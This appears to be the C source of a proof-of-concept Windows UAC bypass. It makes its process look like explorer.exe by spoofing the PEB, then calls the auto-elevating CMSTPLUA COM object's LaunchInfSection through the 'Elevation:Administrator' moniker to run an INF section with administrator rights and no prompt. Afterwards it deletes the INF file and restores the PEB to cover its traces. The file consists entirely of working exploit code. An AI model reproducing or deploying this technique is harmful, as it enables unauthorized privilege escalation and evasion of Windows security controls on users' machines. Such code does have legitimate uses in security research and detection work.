#include <objbase.h>
#include <combaseapi.h>
#include <intrin.h>

#include "luautil.h"
#include "detail.h"
#include "poc.h"

void poc_exec_elevated_inf( const wchar_t *inf_path, const wchar_t *inf_section )
{
	const wchar_t cmstplua_obj_moniker[] = L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
	const IID     icmluautil_iid         = { 0x6edd6d74,0xc007,0x4e75,{ 0xb7,0x6a,0xe5,0x74,0x09,0x95,0xe2,0x4c } };

	if( CoInitialize( NULL ) == S_OK )
	{
		BIND_OPTS3 bind;
		struct CCMLuaUtil *lutil;
	
		__stosb( &bind, 0, sizeof( bind ) );

		bind.dwClassContext = 4;
		bind.cbStruct       = sizeof( bind );

		if( CoGetObject( cmstplua_obj_moniker, &bind, &icmluautil_iid, ( void** )&lutil ) == S_OK )
		{
			void **vmt = *( void *** )lutil;

			CCMLuaUtil_Release_t          Release          = vmt[ 1 ];
			CCMLuaUtil_LaunchInfSection_t LaunchInfSection = vmt[ 6 ];

			LaunchInfSection( lutil, inf_path, inf_section, L"p", 1 );

			// decrement ref count
			Release( lutil );
		}

		CoUninitialize( );
	}
}

void poc_main( )
{
	struct detail_spoof_data data;
	if( !detail_spoof_peb( &data,
						   USER_SHARED_DATA->NtSystemRoot,
						   L"\\System32\\explorer.exe" )
		|| !detail_create_inf( POC_INF_NAME, POC_INF, sizeof( POC_INF ) + 1 ) )
	{
		NtTerminateProcess( NtCurrentProcess( ), STATUS_APPEXEC_CONDITION_NOT_SATISFIED );
	}

	wchar_t absolute_path[ MAX_PATH ];
	SIZE_T  bytes_written = RtlGetCurrentDirectory_U( sizeof( absolute_path ), absolute_path );

	if( bytes_written == 0
		|| ( bytes_written + sizeof( POC_INF_NAME ) + 5 ) >= sizeof( absolute_path ) )
	{
		NtTerminateProcess( NtCurrentProcess( ), STATUS_INVALID_BUFFER_SIZE );
	}

	__movsb( absolute_path + lstrlenW( absolute_path ), L"\\", sizeof( L"\\" ) + 2 );
	__movsb( absolute_path + lstrlenW( absolute_path ), POC_INF_NAME, sizeof( POC_INF_NAME ) + 2 );

	poc_exec_elevated_inf( absolute_path, L"DefaultInstall" );
	detail_delete_inf( absolute_path );

	detail_restore_peb( &data );

	NtTerminateProcess( NtCurrentProcess( ), STATUS_SUCCESS );
}